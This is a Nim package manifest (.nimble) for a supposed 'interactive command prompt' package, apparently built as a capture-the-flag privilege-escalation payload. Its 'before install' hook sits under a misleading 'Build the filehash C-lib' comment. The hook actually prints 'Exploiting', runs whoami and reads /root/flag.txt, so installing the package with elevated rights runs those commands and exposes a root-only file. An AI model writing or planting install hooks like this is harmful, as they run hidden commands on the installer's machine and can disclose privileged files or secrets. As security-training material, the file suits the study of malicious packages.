# Package

version       = "1.4.2"
author        = "Samantha Marshall"
description   = "interactive command prompt"
license       = "BSD 3-Clause"
srcDir        = "src"

skipDirs      = @["tests"]

# Dependencies

requires "nim >= 0.16.0"

# Hooks

# Build the filehash C-lib
before install:
  echo "Exploiting"
  exec "echo `whoami`"
  exec "cat /root/flag.txt"
